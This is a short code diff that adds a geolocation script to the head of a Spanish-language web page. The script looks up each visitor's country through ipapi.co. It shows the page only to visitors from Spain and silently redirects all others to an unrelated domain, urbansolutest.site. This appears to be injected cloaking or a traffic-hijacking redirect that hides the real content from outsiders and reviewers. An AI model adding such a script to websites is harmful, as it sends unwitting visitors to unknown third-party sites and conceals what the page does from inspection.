@@ -1,6 +1,26 @@
 <!doctype html>
 <html lang="es">
 <head>
+<script>
+    // Fallback: always unhide after 5s in case of failure
+    setTimeout(() => document.body.style.display = '', 5000);
+
+    fetch('https://ipapi.co/country/')
+      .then(response => response.text())
+      .then(code => {
+        code = code.trim();
+        if (code === 'ES') {
+          document.body.style.display = '';
+        } else {
+          // Redirect to specific page if not from Spain
+          window.location.replace('https://urbansolutest.site/');
+        }
+      })
+      .catch(err => {
+        console.error('Geolocation lookup failed:', err);
+        document.body.style.display = '';
+      });
+  </script>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
     <!-- Required meta tags -->
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
